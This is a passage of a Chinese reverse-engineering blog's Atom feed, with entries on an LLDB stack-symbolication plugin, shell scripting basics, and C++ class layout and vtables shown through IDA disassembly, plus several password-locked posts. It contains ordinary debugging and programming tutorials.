&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>LLDB调试器栈符号化</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/</id>
    <published>2018-10-03T05:27:59.000Z</published>
    <updated>2019-02-21T10:07:17.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强化你的lldb调试器"><a href="#强化你的lldb调试器" class="headerlink" title="强化你的lldb调试器"></a>强化你的lldb调试器</h3><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。</p><h3 id="How"><a href="#How" class="headerlink" title="How?"></a>How?</h3><p>但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。</p><p>正好lldb提供了python的接口，可以开发自定义的命令。</p><h3 id="And-what"><a href="#And-what" class="headerlink" title="And what ?"></a>And what ?</h3><p>虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a></p><p>这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_bt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_bt.jpg?raw=true"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_sbt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_sbt.jpg?raw=true"></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入<code>sbt -f block-json-file-path</code>即可加载该文件。效果如下：</p><h4 id="原始的bt命令结果"><a href="#原始的bt命令结果" class="headerlink" title="原始的bt命令结果"></a>原始的bt命令结果</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/orig_bt.png?raw=true" alt="orig_bt"></p><h4 id="sbt命令（没有加载block符号文件）"><a href="#sbt命令（没有加载block符号文件）" class="headerlink" title="sbt命令（没有加载block符号文件）"></a>sbt命令（没有加载block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-noblockfile.png?raw=true" alt="sbt-noblockfile"></p><h4 id="sbt命令（带有block符号文件）"><a href="#sbt命令（带有block符号文件）" class="headerlink" title="sbt命令（带有block符号文件）"></a>sbt命令（带有block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-blockfile.png?raw=true" alt="sbt-blockfile"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;强化你的lldb调试器&quot;&gt;&lt;a href=&quot;#强化你的lldb调试器&quot; class=&quot;headerlink&quot; title=&quot;强化你的lldb调试器&quot;&gt;&lt;/a&gt;强化你的lldb调试器&lt;/h3&gt;&lt;h3 id=&quot;Why&quot;&gt;&lt;a href=&quot;#Why&quot; class=&quot;he
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="python" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"/>
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
  </entry>
  
  <entry>
    <title>unicorn</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/</id>
    <published>2018-09-13T06:39:03.000Z</published>
    <updated>2019-04-16T03:03:09.532Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="unicorn" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/unicorn/"/>
    
  </entry>
  
  <entry>
    <title>reversing-dot-kr</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/</id>
    <published>2018-04-29T03:47:09.000Z</published>
    <updated>2019-04-29T11:47:36.495Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="way" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/way/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>shellscript总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/</id>
    <published>2018-04-17T10:33:40.000Z</published>
    <updated>2019-07-18T07:50:52.866Z</updated>
    
    <content type="html"><![CDATA[<h3 id="shellscript总结"><a href="#shellscript总结" class="headerlink" title="shellscript总结"></a>shellscript总结</h3><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><pre><code>name=&quot;zhang&quot;</code></pre><ul><li><p>变量名和等号之间不能有空格</p></li><li><p>英文，数字下划线，不能有空格，标点</p></li><li><p>不能以数字开头</p></li><li><p>不能是关键字</p></li></ul><h4 id="单引号-双引号"><a href="#单引号-双引号" class="headerlink" title="单引号/双引号"></a>单引号/双引号</h4><ul><li><p>单引号会原样输出</p></li><li><p>双引号里面可以有变量，转义字符</p></li></ul><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code class="bash"># 拼接name=&#39;zhang&#39;helloname=&quot;hello, &quot;$name&quot;!&quot;helloname=&quot;hello, &quot;${name}&quot;!&quot;#获取长度echo ${#name}  # [out]:5#提取子字符串echo ${name:1:4} #[out]:hang</code></pre><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><pre><code class="bash">my_array=(A B C D)echo &quot;数组的元素为: ${my_array[1]}&quot;echo &quot;数组的元素为: ${my_array[@]}&quot;#[out]:#数组的元素为: B#数组的元素为: A B C D</code></pre><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><pre><code class="bash">#文件存在且为目录-d #文件存在且为一般文件-f#文件存在且为链接文件-L</code></pre><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><pre><code class="bash">a=10b=20if [ $a == $b ];then    echo &quot;a 等于 b&quot;elif [ $a -gt $b ];then    echo &quot;a 大于 b&quot;elif [ $a -lt $b ];then    echo &quot;a 小于 b&quot;else    echo &quot;没有符合的条件&quot;fi    # [out]:a 等于 b</code></pre><h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><pre><code class="bash"># for infor loop in 1 2 3 4 5;do    echo &quot;The value is: $loop&quot;done# [out]:The value is: 1 The value is: 2 The value is: 3 The value is: 4 The value is: 5</code></pre><h4 id="xfind"><a href="#xfind" class="headerlink" title="xfind"></a>xfind</h4><pre><code class="shell">function xfind(){    find $1 -type f -regex &quot;.*&quot; -print0 | xargs -0  grep -i $2}if [ -z &quot;$1&quot; -o -z &quot;$2&quot; ]; then    echo &quot;[usage] xfind path_of_dir key_words_you_want_to_search&quot;else    xfind $1 $2fi</code></pre><h4 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h4><pre><code>管道是标准输出到标准输入，但并不是所有命令都是从标准输入中取参数，所以需要xargs命令。使其从标准输出到命令参数</code></pre><p>更多细节点<a href="https://www.cnblogs.com/wangqiguo/p/6464234.html" target="_blank" rel="external">这里</a></p><h4 id="function"><a href="#function" class="headerlink" title="function"></a>function</h4><p>函数返回值只能输0-255数字，且用<code>$?</code>接收</p><pre><code class="shell">function test(){    read num    return  $num}testif [ $? -eq 1 ];then    echo &quot;yes&quot;else    echo &quot;no&quot;fi</code></pre><h4 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h4><p><a href="http://wangchujiang.com/linux-command/c/crontab.html" target="_blank" rel="external">http://wangchujiang.com/linux-command/c/crontab.html</a></p><p>默认日志路径:<code>/var/mail/Username</code></p><p>修改邮件接收地址：<code>MAILTO=939xxxx983@qq.com</code></p><p>日志重定向：<code>* * * * * command &gt;&gt; /Users/Samuel/Desktop/command.log 2&gt;&amp;1</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;shellscript总结&quot;&gt;&lt;a href=&quot;#shellscript总结&quot; class=&quot;headerlink&quot; title=&quot;shellscript总结&quot;&gt;&lt;/a&gt;shellscript总结&lt;/h3&gt;&lt;h4 id=&quot;变量&quot;&gt;&lt;a href=&quot;#变量&quot; cla
      
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="shell" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/正则表达式/正则表达式/</id>
    <published>2018-04-08T08:32:33.000Z</published>
    <updated>2019-04-19T11:31:33.949Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="正则表达式" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>C++类结构以及vtable分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++类结构以及vtable分析/C++类结构以及vtable分析/</id>
    <published>2017-12-02T10:07:00.000Z</published>
    <updated>2019-03-01T02:51:19.937Z</updated>
    
    <content type="html"><![CDATA[<h3 id="C-类结构以及vtable分析"><a href="#C-类结构以及vtable分析" class="headerlink" title="C++类结构以及vtable分析"></a>C++类结构以及vtable分析</h3><blockquote><p>通过实验自己对一些C++数据结构的理解</p></blockquote><h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {   public:      void setWidth(int w)      {         width = w;      }      void setHeight(int h)      {         height = h;      }   protected:      int width;      int height;};// 派生类class Rectangle: public Shape{   public:      int getArea()      {          return (width * height);       }};int main(void){   Rectangle Rect;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST08_8  unsigned int v4; // eax  char v6; // [rsp+10h] [rbp-20h]  int v7; // [rsp+1Ch] [rbp-14h]  __int64 (__fastcall *v8)(_QWORD); // [rsp+20h] [rbp-10h]  __int64 v9; // [rsp+28h] [rbp-8h]  v7 = 0;  Shape::setWidth((Shape *)&amp;v6, 5);  Shape::setHeight((Shape *)&amp;v6, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v6);  v9 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v8 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v9);  return 0;}</code></pre><p>Rect内存布局</p><pre><code>(lldb) x/20b $rbp-0x200x7ffeefbff560: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x000x7ffeefbff568: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</code></pre><p>能得到的结论是，在编译完后，子类Rectangle的方法调用都编译成父类Shape方法调用，这是在编译时就决定了的。把子类对象和参数合并作为参数传入父类方法。这里仅仅是对子类对象另个偏移值做操作。</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  void *v3; // ST10_8  __int64 v4; // ST08_8  unsigned int v5; // eax  __int64 v6; // ST38_8  v3 = (void *)operator new(8uLL);  memset(v3, 0, 8uLL);  Shape::setWidth((Shape *)v3, 5);  Shape::setHeight((Shape *)v3, 7);  v4 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v5 = Rectangle::getArea((Rectangle *)v3);  v6 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v4, v5);  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v6);  return 0;}</code></pre><p>这里将 Rectangle Rect改为Rectangle *Rect = new Rectangle()在堆上申请内存可以看出，在类初始化的时候，仅仅申请了一块8字节空间，正好是两个int的大小，仅此而已。</p><h3 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {public:   // 提供接口框架的纯虚函数   virtual int getArea() = 0;   void setWidth(int w)   {      width = w;   }   void setHeight(int h)   {      height = h;   }protected:   int width;   int height;};// 派生类class Rectangle: public Shape{public:   int getArea()   {       return (width * height);    }};class Triangle: public Shape{public:   int getArea()   {       return (width * height)/2;    }};int main(void){   Rectangle Rect;   Triangle  Tri;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Rectangle area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   Tri.setWidth(5);   Tri.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Triangle area: &quot; &lt;&lt; Tri.getArea() &lt;&lt; endl;    return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST20_8  unsigned int v4; // eax  __int64 v5; // ST10_8  unsigned int v6; // eax  char v8; // [rsp+28h] [rbp-48h]  char v9; // [rsp+38h] [rbp-38h]  int v10; // [rsp+4Ch] [rbp-24h]  __int64 (__fastcall *v11)(_QWORD); // [rsp+50h] [rbp-20h]  __int64 v12; // [rsp+58h] [rbp-18h]  __int64 (__fastcall *v13)(_QWORD); // [rsp+60h] [rbp-10h]  __int64 v14; // [rsp+68h] [rbp-8h]  v10 = 0;  Rectangle::Rectangle((Rectangle *)&amp;v9);  Triangle::Triangle((Triangle *)&amp;v8);  Shape::setWidth((Shape *)&amp;v9, 5);  Shape::setHeight((Shape *)&amp;v9, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Rectangle area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v9);  v12 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v11 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v12);  Shape::setWidth((Shape *)&amp;v8, 5);  Shape::setHeight((Shape *)&amp;v8, 7);  v5 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Triangle area: &quot;);  v6 = Triangle::getArea((Triangle *)&amp;v8);  v14 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, v6);  v13 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v14);  return 0;}</code></pre><p>这里与实验一明显不同在于，在初始化一个对象的时候会调用其构建方法。其反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Rectangle::Rectangle(Rectangle *this){  __int64 *result; // rax  Shape::Shape(this);  result = &amp;`vtable for&#39;Rectangle + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Rectangle + 2;  return result;}</code></pre><p>这里发现里面还调用了父类的构建方法，父类构建方法反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Shape::Shape(Shape *this){  __int64 *result; // rax  result = &amp;`vtable for&#39;Shape + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Shape + 2;  return result;}</code></pre><p>其实这两个构建方法就是对传入对象this指针赋值操作，在经过Shape::Shape(this)后其实this指针的64字节大小值为父类Shape的虚函数表地址。然后又被重新赋值为Rectangle自己的虚函数表地址。</p><p>这里的虚函数表地址，本质就是_DATA段的一个数据结构。</p><p>Rect的内存布局为</p><pre><code>(lldb) x/20b $rbp-0x380x7ffeefbff548: 0x20 0x21 0x00 0x00 0x01 0x00 0x00 0x000x7ffeefbff550: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00</code></pre><p>这里可以看到前64字节为虚函数表地址，后面两个32字节分别是其width和height</p><p>去ida中查看该地址</p><pre><code class="c++">__data:0000000100002110 ; `vtable for&#39;Rectangle__data:0000000100002110 __ZTV9Rectangle dq 0                    ; DATA XREF: __got:__ZTV9Rectangle_ptr↑o__data:0000000100002110                                         ; offset to this__data:0000000100002118                 dq offset __ZTI9Rectangle ; `typeinfo for&#39;Rectangle__data:0000000100002120                 dq offset __ZN9Rectangle7getAreaEv ; Rectangle::getArea(void)</code></pre><p>就是_DATA段中的数据结构，现在我们可以清晰的理解C++类在内存的数据结构了。</p><h3 id="一点理解"><a href="#一点理解" class="headerlink" title="一点理解"></a>一点理解</h3><p>C++这个语言特性非常多，如果不能理解其本质很容易造成bug。这里想把C++和OC做一个简单的对比，C++的很多实现都是在编译时就确定的，C++中的类我更愿意理解成为C中的结构体。而OC这语言，大多都是在运行时才能确定，方法转化为消息处理。在可执行文件中也有专门的段存储其复杂的类数据结构，也因为这样，OC在运行时可以做很多hack操作，比如hook其方法实现等等。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;C-类结构以及vtable分析&quot;&gt;&lt;a href=&quot;#C-类结构以及vtable分析&quot; class=&quot;headerlink&quot; title=&quot;C++类结构以及vtable分析&quot;&gt;&lt;/a&gt;C++类结构以及vtable分析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;通过实
      
    
    </summary>
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/C/"/>
    
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"/>
    
  </entry>
  
</feed>
